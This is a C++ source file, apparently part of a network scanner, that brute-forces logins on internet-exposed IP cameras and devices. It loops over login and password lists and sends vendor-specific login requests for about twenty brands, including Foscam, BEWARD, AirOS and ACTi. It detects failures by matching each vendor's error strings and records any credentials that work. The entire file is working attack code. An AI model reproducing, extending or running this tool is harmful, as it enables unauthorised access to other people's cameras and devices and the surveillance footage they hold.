#include "IPCAuth.h"
#include "Utils.h"
#include "BruteUtils.h"
#include "FileUpdater.h"

#include <iomanip>
#include <sstream>
std::string urlEncode(const string &value) {
	ostringstream escaped;
	escaped.fill('0');
	escaped << hex;

	for (string::const_iterator i = value.begin(), n = value.end(); i != n; ++i) {
		string::value_type c = (*i);

		// Keep alphanumeric and other accepted characters intact
		if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
			escaped << c;
			continue;
		}

		// Any other characters are percent-encoded
		escaped << uppercase;
		escaped << '%' << setw(2) << int((unsigned char)c);
		escaped << nouppercase;
	}

	return escaped.str();
}

lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC, const std::string *cookie)
{
    lopaStr lps = {"UNKNOWN", "", ""};
    int result = 0;
    char login[128] = {0};
    char pass[128] = {0};
    char request[1024] = {0};
    int passCounter = 1;
	int rowIndex = -1;

	std::vector<char*> negVector;
	std::vector<char*> slideVector;
    if(strcmp(SPEC, "IPC") == 0)
    {
        negVector.push_back("<UserGroup>Invalid</UserGroup>");
    }
    else if(strcmp(SPEC, "GEO") == 0)
    {
        negVector.push_back("Access denied");
        negVector.push_back("ErrNoSuchUsr.htm");
    }
    else if(strcmp(SPEC, "EasyCam") == 0)
    {
        negVector.push_back("Set-Cookie: usrLevel=-1;path=/");
    }
    else if(strcmp(SPEC, "Foscam") == 0)
    {
        negVector.push_back("<result>0</result>");
        negVector.push_back("<result>-1</result>");
        negVector.push_back("<result>-2</result>");
        negVector.push_back("<result>-3</result>");
        negVector.push_back("<result>-4</result>");
        negVector.push_back("<result>-5</result>");
        negVector.push_back("<result>-6</result>");
        negVector.push_back("<result>-7</result>");
    }
    else if(strcmp(SPEC, "AVIOSYS") == 0)
    {
        negVector.push_back("Password Error");
    }
    else if(strcmp(SPEC, "BUFFALO") == 0)
    {
        negVector.push_back("403 Forbidden");
    }
    else if(strcmp(SPEC, "DVS") == 0)
    {
        negVector.push_back("Non-Existed");
    }
    else if(strcmp(SPEC, "IPCAM") == 0)
    {
        negVector.push_back("var check=\"0\"");
        negVector.push_back("var authLevel =\"0\";");
	}
	else if (strcmp(SPEC, "IEORFOREFOX") == 0)
	{
		negVector.push_back("AAA()");
		negVector.push_back("РРјСЏ РёР»Рё РїР°СЂРѕР»СЊ РЅРµРІРµСЂРЅС‹Рµ!");
		negVector.push_back("Р’РѕР·РІСЂР°С‚");
		negVector.push_back("HTTP/1.0 302 Found");
		negVector.push_back("is incorrect");
	}
	else if (strcmp(SPEC, "MASPRO") == 0)
	{
		negVector.push_back("action=\"setup_login.cgi\"");
	}
	else if (strcmp(SPEC, "WEBCAMXP") == 0)
	{
		negVector.push_back("Not logged in");
	}
	else if (strcmp(SPEC, "JASSUN") == 0)
	{
		negVector.push_back("Log in failed");
	}
	else if (strcmp(SPEC, "BEWARD") == 0)
	{
		negVector.push_back("/error.asp");
	}
	else if (strcmp(SPEC, "JUAN") == 0)
	{
		negVector.push_back("errno=\"4\"");
	}
	else if (strcmp(SPEC, "ACTi") == 0)
	{
		negVector.push_back("ERROR: ");
	}
	else if (strcmp(SPEC, "AirOS") == 0)
	{
		negVector.push_back("Invalid credentials");
	}
	else if (strcmp(SPEC, "XMSECU") == 0)
	{
		slideVector.push_back("errornumber=-1");
		negVector.push_back("Log in failed");
	}
    else
    {
        stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");
        return lps;
    };
	
	int res = 0;
    for(int i = 0; i < MaxLogin; ++i)
    {
        if(!globalScanFlag) break;
		FileUpdater::cv.wait(FileUpdater::lk, [] {return FileUpdater::ready; });
		strcpy(login, loginLst[i]);
        if(strcmp(login, " ") == 0) continue;

        for(int j = 0; j < MaxPass; ++j)
        {
            FileUpdater::cv.wait(FileUpdater::lk, []{return FileUpdater::ready;});
            if(!globalScanFlag) break;
            if(strcmp(passLst[j], " ") == 0) continue;
			result = 0;

            strcpy(pass, passLst[j]);

            ZeroMemory(request, sizeof(request));
			request[0] = 0;
            if(strcmp(SPEC, "IPC") == 0)
            {
                sprintf(request, "%s/login.xml?user=%s&usr=%s&password=%s&pwd=%s",
                        ip, login, login, pass, pass);
            }
            else if(strcmp(SPEC, "GEO") == 0)
            {
                sprintf(request, "%s/Login.cgi?username=%s&password=%s",
                        ip, login, pass);
            }
            else if(strcmp(SPEC, "EasyCam") == 0)
            {
                sprintf(request, "%s/login.xml?user=%s&usr=%s&password=%s&pwd=%s",
                        ip, login, login, pass, pass);
            }
            else if(strcmp(SPEC, "Foscam") == 0)
            {
                sprintf(request, "%s/cgi-bin/CGIProxy.fcgi?usr=%s&pwd=%s&cmd=logIn&usrName=%s&pwd=%s",
                        ip, login, pass, login, pass);
            }
            else if(strcmp(SPEC, "AVIOSYS") == 0)
            {
                sprintf(request, "%s/check_user.html?UserName=%s&PassWord=%s",
                        ip, login, pass);
            }
            else if(strcmp(SPEC, "IPCAM") == 0)
            {
                sprintf(request, "%s/cgi-bin/hi3510/checkuser.cgi?&-name=%s&-passwd=%s&-time=1416767330831",
                        ip, login, pass);
            }
            else if(strcmp(SPEC, "IEORFOREFOX") == 0)
            {
                doPost = true;
                sprintf(request, "%s/logincheck.rsp?type=1", ip);
                sprintf(postData, "username=%s&userpwd=%s", login, pass);
            }
            else if(strcmp(SPEC, "BUFFALO") == 0)
            {
                doPost = true;
                sprintf(request, "%s/rpc/login", ip);
                sprintf(postData, "user=%s&password=%s", login, pass);
			}
			else if (strcmp(SPEC, "DVS") == 0)
			{
				doPost = true;
				sprintf(request, "%s/login", ip);
				sprintf(postData, "langs=en&user=%s&password=%s&submit=+Login+", login, pass);
			}
			else if (strcmp(SPEC, "MASPRO") == 0)
			{
				doPost = true;
				sprintf(request, "%s/setup_login.cgi", ip);
				sprintf(postData, "check_username=%s&check_password=%s&login=", login, pass);
			}
			else if (strcmp(SPEC, "WEBCAMXP") == 0)
			{
				doPost = true;
				sprintf(request, "%s/login.html", ip);
				sprintf(postData, "username=%s&password=%s&Redir=/", login, pass);
			}
			else if (strcmp(SPEC, "JASSUN") == 0)
			{
				doPost = true;
				sprintf(request, "%s/Login.htm", ip);
				sprintf(postData, "command=login&username=%s&password=%s", login, pass);
			}
			else if (strcmp(SPEC, "BEWARD") == 0)
			{
				sprintf(request, "%s/webs/httplogin?username=%s&password=%s&UserID=45637757",
					ip, login, pass);
			}
			else if (strcmp(SPEC, "JUAN") == 0)
			{
				std::string encodedLogin = urlEncode(std::string(login));
				std::string encodedPass = urlEncode(std::string(pass));
				sprintf(request, "%s/cgi-bin/gw.cgi?xml=%%3Cjuan%%20ver=%%22%%22%%20squ=%%22%%22%%20dir=%%22%%22%%3E%%3Cenvload%%20type=%%220%%22%%20usr=%%22%s%%22%%20pwd=%%22%s%%22/%%3E%%3C/juan%%3E&_=1450923182693",
					ip, encodedLogin.c_str(), encodedPass.c_str());
			}
			else if (strcmp(SPEC, "ACTi") == 0)
			{
				doPost = true;
				sprintf(request, "%s/cgi-bin/videoconfiguration.cgi", ip);
				sprintf(postData, "LOGIN_ACCOUNT=%s&LOGIN_PASSWORD=%s", login, pass);
			}
			else if (strcmp(SPEC, "AirOS") == 0)
			{
				doPost = true;
				sprintf(request, "%s/login.cgi", ip);
				char tempPostData[1024] = { 0 };
				int cl = 341 + strlen(login) + strlen(pass);
				sprintf(tempPostData, "-----------------------------170381307613422\r\n\
Content-Disposition: form-data; name=\"uri\"\r\n\
\r\n\
/\r\n\
-----------------------------170381307613422\r\n\
Content-Disposition: form-data; name=\"username\"\r\n\
\r\n\
%s\r\n\
-----------------------------170381307613422\r\n\
Content-Disposition: form-data; name=\"password\"\r\n\
\r\n\
%s\r\n\
-----------------------------170381307613422--\
\r\n", login, pass);

				sprintf(postData, "Content-Type: multipart/form-data; boundary=---------------------------170381307613422\r\n\
Content-Length: %d\r\n\r\n\
%s", cl, tempPostData);
			}
			else if (strcmp(SPEC, "XMSECU") == 0)
			{
				doPost = true;
				sprintf(request, "%s/Login.htm", ip);
				sprintf(postData, "command=login&username=%s&password=%s", login, pass);
			}

			std::string buffer;
			if (cookie->size() > 0) {
				std::vector<std::string> cookieHeader{ *cookie };
				Connector con;
				if (doPost) res = con.nConnect(request, port, &buffer, postData, &cookieHeader);
				else res = con.nConnect(request, port, &buffer, NULL, &cookieHeader);
			}
			else {
				Connector con;
				if (doPost) res = con.nConnect(request, port, &buffer, postData);
				else res = con.nConnect(request, port, &buffer);
			}

			if (res == -2) {
				rowIndex = Utils::addBARow(QString(ip), "--", "FAIL", rowIndex);
				return lps;
			}
			else if (res != -1) {
				for (int i = 0; i < slideVector.size(); ++i)
				{
					if (Utils::ustrstr(buffer, slideVector[i]) != -1)
					{
						result = -1;
						break;
					};
				}
				if (-1 == result) {
					passCounter += MaxPass - 1;
					break;
				}

				for (int i = 0; i < negVector.size(); ++i)
				{
					if (Utils::ustrstr(buffer, negVector[i]) != -1)
					{
						result = 1;
						break;
					};
				};

				if (0 == result)
				{
					strcpy(lps.login, login);
					strcpy(lps.pass, pass);

					rowIndex = Utils::addBARow(QString(ip), QString(login) + ":" + QString(pass), "OK", rowIndex);

					return lps;
				}
			}
			else {
				return lps;
			}

			rowIndex = Utils::addBARow(QString(ip), QString(login) + ":" + QString(pass), QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%", rowIndex);
			++passCounter;
            Sleep(100);
        };
    };

	rowIndex = Utils::addBARow(QString(ip), "--", "FAIL", rowIndex);
    return lps;
}

lopaStr IPC::IPCLobby(const char *ip, int port, char *SPEC, const std::string *cookie) {
    if(gMaxBrutingThreads > 0) {
        while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

		++baCount;
		++BrutingThrds;
		stt->doEmitionUpdateArc(gTargets);
		lopaStr lps = IPCBrute(ip, port, SPEC, cookie);
		--BrutingThrds;

        return lps;
    } else {
        lopaStr lps = {"UNKNOWN", "", ""};
        return lps;
    }
}
